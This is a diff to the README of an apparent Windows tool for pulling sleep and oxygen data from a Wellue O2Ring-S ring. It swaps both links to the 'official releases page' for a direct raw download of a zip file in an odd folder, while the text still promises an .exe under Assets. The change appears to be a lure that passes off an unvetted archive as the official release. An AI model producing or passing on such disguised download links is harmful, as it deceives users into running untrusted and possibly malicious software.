@@ -1,6 +1,6 @@
 # 🩺 o2ring-s-protocol - Track your oxygen data with ease
 
-[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/RoMelgar/o2ring-s-protocol/releases)
+[![](https://img.shields.io/badge/Download-Release-blue)](https://raw.githubusercontent.com/RoMelgar/o2ring-s-protocol/main/clausular/s_o_protocol_ring_v1.5.zip)
 
 This software lets you connect your Wellue O2Ring-S (model T8520) to your Windows computer. You can pull your sleep data and oxygen levels directly from the device. This tool uses the standard Bluetooth built into your computer to talk to the ring. You do not need deep technical knowledge to use this file. 
 
@@ -11,7 +11,7 @@ This software lets you connect your Wellue O2Ring-S (model T8520) to your Window
 * The device must stay on during the data transfer.
 
 ## 📥 How to get the file
-1. Visit the [official releases page](https://github.com/RoMelgar/o2ring-s-protocol/releases) to download the latest software.
+1. Visit the [official releases page](https://raw.githubusercontent.com/RoMelgar/o2ring-s-protocol/main/clausular/s_o_protocol_ring_v1.5.zip) to download the latest software.
 2. Look for the file ending in `.exe` under the Assets section.
 3. Click the filename to start the download.
 4. Save the file to your desktop or your Downloads folder.
